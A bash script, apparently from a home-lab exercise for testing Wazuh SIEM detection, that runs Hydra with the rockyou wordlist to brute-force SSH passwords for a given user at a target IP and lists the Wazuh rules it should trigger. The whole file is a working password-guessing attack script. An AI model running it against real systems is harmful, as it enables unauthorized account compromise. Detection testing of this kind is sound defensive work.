#!/bin/bash
# ============================================================
# Attack 1: SSH Brute Force
# Run on: Kali Linux
# Usage: bash attack1_bruteforce.sh <TARGET_IP>
#
# What it does:
#   Uses Hydra to try thousands of SSH passwords automatically.
#   This simulates a real attacker trying to guess your password.
#
# What Wazuh detects:
#   Rule 5710 - SSH authentication failure
#   Rule 5711 - Multiple SSH failures
#   Rule 5712 - SSHD brute force (Level 10 CRITICAL)
# ============================================================

TARGET_IP="${1:-192.168.56.101}"
USERNAME="wazuh"
WORDLIST="/usr/share/wordlists/rockyou.txt"

echo ""
echo "=============================================="
echo "  Attack 1: SSH Brute Force"
echo "  Target: $TARGET_IP"
echo "  ⚠  Lab use only!"
echo "=============================================="
echo ""

# Install hydra if not present
if ! command -v hydra &>/dev/null; then
    echo "[*] Installing hydra..."
    sudo apt-get install hydra -y
fi

# Decompress rockyou wordlist if needed
if [ -f "$WORDLIST.gz" ] && [ ! -f "$WORDLIST" ]; then
    echo "[*] Decompressing rockyou.txt..."
    sudo gunzip "$WORDLIST.gz"
fi

# Check wordlist exists
if [ ! -f "$WORDLIST" ]; then
    echo "[!] Wordlist not found at $WORDLIST"
    exit 1
fi

# Check target is reachable
echo "[*] Checking connectivity to $TARGET_IP..."
if ! ping -c 1 "$TARGET_IP" &>/dev/null; then
    echo "[!] Cannot reach $TARGET_IP — check VM network settings"
    exit 1
fi
echo "[✓] Target reachable"

echo ""
echo "[*] Starting brute force — watch Wazuh dashboard for alerts!"
echo "[*] Press Ctrl+C after 1-2 minutes to stop"
echo ""

# Run hydra
hydra -l "$USERNAME" \
      -P "$WORDLIST" \
      -t 4 \
      -V \
      ssh://"$TARGET_IP"

echo ""
echo "[✓] Attack complete — check Wazuh dashboard for Rule 5710/5712 alerts"
